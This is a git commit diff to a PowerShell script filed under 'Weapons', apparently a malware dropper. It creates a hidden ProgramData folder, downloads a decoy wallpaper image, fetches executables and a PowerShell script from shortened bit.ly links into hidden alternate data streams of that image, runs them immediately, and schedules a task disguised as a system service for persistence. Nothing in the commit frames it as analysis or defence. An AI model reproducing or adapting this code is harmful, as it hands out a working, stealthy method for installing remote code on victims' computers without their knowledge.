3a0cd42145c1e5d5b8172c9443d98817d0e6ecbf
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 05:22:00 +0530

    Added system64 GDrive

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -3,5 +3,6 @@
 mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
-cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe"
-schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
+cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
+schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /V1 /Z
+cmd /c "wget https://bit.ly/3KlymYH -o C:\ProgramData\.temp\94002.jpg:system64.ps1 && C:\ProgramData\.temp\94002.jpg:system64.ps1"
